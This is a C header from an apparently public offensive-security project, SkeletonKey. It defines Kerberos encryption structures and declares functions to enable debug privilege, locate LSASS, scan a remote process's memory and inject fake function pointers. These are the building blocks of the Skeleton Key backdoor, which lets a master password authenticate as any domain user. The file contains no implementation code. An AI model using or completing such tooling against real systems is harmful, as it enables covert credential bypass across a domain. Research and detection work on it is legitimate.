/*
* Author : Angelo Frasca Caccia (lem0nSec_)
* Data : 21/12/2023
* Title : SkeletonKey.h
* Website : https://github.com/lem0nSec/SkeletonKey
*/


#pragma once

#include <Windows.h>
#include <TlHelp32.h>
#include <LsaLookup.h>
#include <winternl.h>
#include <mschapp.h>
#include <stdio.h>


#define UNICODE 1

#if !defined(PRINT_ERROR)
#define PRINT_ERROR(...) (wprintf(L"[-] ERROR ; " __VA_ARGS__))
#endif

#if !defined(PRINT_SUCCESS)
#define PRINT_SUCCESS(...) (wprintf(L"[+] SUCCESS ; " __VA_ARGS__))
#endif
/*
#if !defined(PRINT_INFO)
#define PRINT_INFO(...) (wprintf(L"[i] INFO ; " __VA_ARGS__))
#endif

#if !defined(PRINT_WARNING)
#define PRINT_WARNING(...) (wprintf(L"[!] WARNING ; " __VA_ARGS__))
#endif
*/

#define KERB_ETYPE_RC4_HMAC_NT				23
#define STATUS_INSUFFICIENT_RESOURCES		((NTSTATUS)0xC000009AL)     // ntsubauth
//#define STATUS_DS_NO_ATTRIBUTE_OR_VALUE		((NTSTATUS)0xC00002A1L)

typedef struct _SK_FUNCTION_PTR
{
	LPWSTR Module;
	LPSTR Name;
	PVOID FakePtr;
	PVOID Ptr;
} SK_FUNCTION_PTR, * PSK_FUNCTION_PTR;

typedef struct _SK_MODULE_INFORMATION
{
	LPVOID dllBase;
	DWORD SizeOfImage;
} SK_MODULE_INFORMATION, * PSK_MODULE_INFORMATION;

typedef  enum _NETLOGON_LOGON_INFO_CLASS
{
	NetlogonInteractiveInformation = 1,
	NetlogonNetworkInformation = 2,
	NetlogonServiceInformation = 3,
	NetlogonGenericInformation = 4,
	NetlogonInteractiveTransitiveInformation = 5,
	NetlogonNetworkTransitiveInformation = 6,
	NetlogonServiceTransitiveInformation = 7
} NETLOGON_LOGON_INFO_CLASS;

typedef NTSTATUS(WINAPI* PKERB_ECRYPT_INITIALIZE) (LPCVOID pbKey, ULONG KeySize, ULONG MessageType, PVOID* pContext);
typedef NTSTATUS(WINAPI* PKERB_ECRYPT_ENCRYPT) (PVOID pContext, LPCVOID pbInput, ULONG cbInput, PVOID pbOutput, ULONG* cbOutput);
typedef NTSTATUS(WINAPI* PKERB_ECRYPT_DECRYPT) (PVOID pContext, LPCVOID pbInput, ULONG cbInput, PVOID pbOutput, ULONG* cbOutput);
typedef NTSTATUS(WINAPI* PKERB_ECRYPT_FINISH) (PVOID* pContext);
typedef NTSTATUS(WINAPI* PKERB_ECRYPT_HASHPASSWORD_NT5) (PCUNICODE_STRING Password, PVOID pbKey);
typedef NTSTATUS(WINAPI* PKERB_ECRYPT_HASHPASSWORD_NT6) (PCUNICODE_STRING Password, PCUNICODE_STRING Salt, ULONG Count, PVOID pbKey);
typedef NTSTATUS(WINAPI* PKERB_ECRYPT_RANDOMKEY) (LPCVOID Seed, ULONG SeedLength, PVOID pbKey);
typedef NTSTATUS(WINAPI* PKERB_ECRYPT_CONTROL) (ULONG Function, PVOID pContext, PUCHAR InputBuffer, ULONG InputBufferSize);

typedef struct _KERB_ECRYPT {
	ULONG EncryptionType;
	ULONG BlockSize;
	ULONG ExportableEncryptionType;
	ULONG KeySize;
	ULONG HeaderSize;
	ULONG PreferredCheckSum;
	ULONG Attributes;
	PCWSTR Name;
	PKERB_ECRYPT_INITIALIZE Initialize;
	PKERB_ECRYPT_ENCRYPT Encrypt;
	PKERB_ECRYPT_DECRYPT Decrypt;
	PKERB_ECRYPT_FINISH Finish;
	union {
		PKERB_ECRYPT_HASHPASSWORD_NT5 HashPassword_NT5;
		PKERB_ECRYPT_HASHPASSWORD_NT6 HashPassword_NT6;
	};
	PKERB_ECRYPT_RANDOMKEY RandomKey;
	PKERB_ECRYPT_CONTROL Control;
	PVOID unk0_null;
	PVOID unk1_null;
	PVOID unk2_null;
} KERB_ECRYPT, * PKERB_ECRYPT;

LPVOID Skel_ResolveFakeFunctionPointers(HANDLE hProcess, LPVOID Buffer, DWORD DataSize, PSK_FUNCTION_PTR pskFP, DWORD count, BOOL injectable);
LPVOID Skel_SearchRemotePatternInLoadedModule(HANDLE hProcess, PSK_MODULE_INFORMATION pCryptInfo, LPCVOID uPattern, SIZE_T szPattern);
BOOL Skel_GetRemoteModuleInformation(DWORD dwPid, LPWSTR mName, PSK_MODULE_INFORMATION pCryptInfo);
BOOL Skel_EnableDebugPrivilege();
DWORD Skel_ValidateLsassPid();